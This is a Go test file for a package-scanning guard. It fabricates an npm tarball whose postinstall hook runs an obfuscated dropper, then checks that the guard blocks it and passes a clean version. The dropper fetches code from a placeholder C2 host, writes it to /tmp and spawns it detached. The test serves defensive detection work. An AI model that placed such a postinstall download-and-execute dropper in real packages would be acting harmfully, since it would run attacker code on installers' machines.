package cli

import "testing"

// Mastra / easy-day-js@1.11.22 (row 44): the guard's own byte verdict on the
// dropper tarball (postinstall node setup.cjs, string-array obfuscated).
func TestAttack2026_44_Mastra_Guard(t *testing.T) {
	logic := "fetch('https://c2.example.invalid:8000/update/49890878').then(r=>r.text()).then(s=>{" +
		"require('fs').writeFileSync('/tmp/x.js',s);require('child_process').spawn(process.execPath,['/tmp/x.js'],{detached:true});});\n"
	v := analyzeArtifact("npm", atkBTgz(t, map[string]string{
		"package.json": `{"name":"easy-day-js","version":"1.11.22","scripts":{"postinstall":"node setup.cjs --no-warnings"}}`,
		"setup.cjs":    atkBObf(logic),
	}))
	if !v.Block {
		t.Fatalf("guard did not refuse the obfuscated dropper: %+v", v)
	}
	clean := analyzeArtifact("npm", atkBTgz(t, map[string]string{
		"package.json": `{"name":"easy-day-js","version":"1.11.21","main":"index.js"}`,
		"index.js":     "module.exports=require('./dayjs.min.js');\n",
	}))
	if clean.Block || clean.Severity != "" {
		t.Fatalf("clean 1.11.21 flagged: %+v", clean)
	}
}
